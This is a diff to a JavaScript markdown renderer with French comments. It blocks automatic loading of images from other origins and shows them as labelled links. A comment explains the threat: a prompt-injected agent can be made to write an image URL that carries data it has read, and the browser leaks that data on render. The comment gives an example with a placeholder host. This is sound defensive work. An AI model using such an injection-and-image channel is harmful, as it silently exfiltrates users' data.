@@ -23,13 +23,43 @@ function safeUrl(href) {
   return null;
 }
 
+/**
+ * L'adresse vient-elle de l'Atelier lui-même ?
+ *
+ * Une image se charge toute seule, sans que personne ne clique. C'est le canal
+ * d'exfiltration classique des interfaces de conversation : il suffit qu'un
+ * agent lise une page ou un fichier piégé pour qu'on lui fasse écrire
+ * `![](https://ailleurs/?d=<ce-qu-il-vient-de-lire>)`, et le navigateur part
+ * le livrer en silence au rendu. Ici les agents tournent en
+ * `bypassPermissions` et lisent ce qu'ils veulent : le canal serait large.
+ *
+ * On ne charge donc que ce qui vient de chez nous. Le reste devient un lien,
+ * que l'on voit avant de le suivre.
+ */
+function memeOrigine(url) {
+  try {
+    return new URL(url).origin === globalThis.location?.origin;
+  } catch {
+    return false;
+  }
+}
+
+function hote(url) {
+  try {
+    return new URL(url).host;
+  } catch {
+    return "";
+  }
+}
+
 // Les emplacements réservés qui mettent un fragment à l'abri des passes
 // suivantes. Le caractère nul n'apparaît jamais dans du texte échappé : rien
 // de ce que le modèle écrit ne peut donc en fabriquer un.
 const GARDE = "\u0000";
 
-function lienVers(url, texte) {
-  return `<a href="${escapeHtml(url)}" target="_blank" rel="noopener noreferrer">${texte}</a>`;
+function lienVers(url, texte, classe = "") {
+  const cls = classe ? ` class="${classe}"` : "";
+  return `<a${cls} href="${escapeHtml(url)}" target="_blank" rel="noopener noreferrer">${texte}</a>`;
 }
 
 function poser(mis, html) {
@@ -81,9 +111,17 @@ function inlineMarkdown(escaped) {
   s = s.replace(IMAGE, (entier, alt, href) => {
     const url = safeUrl(href);
     if (!url) return alt;
+    if (memeOrigine(url)) {
+      return poser(
+        mis,
+        `<img class="md-image" src="${escapeHtml(url)}" alt="${alt}" loading="lazy">`
+      );
+    }
+    // Une image d'ailleurs ne se charge pas d'elle-même : on la propose.
+    const nom = alt || url;
     return poser(
       mis,
-      `<img class="md-image" src="${escapeHtml(url)}" alt="${alt}" loading="lazy">`
+      lienVers(url, `${nom}<span class="md-image-hote">${escapeHtml(hote(url))}</span>`, "md-image-lien")
     );
   });
   s = s.replace(LIEN, (entier, label, href) => {
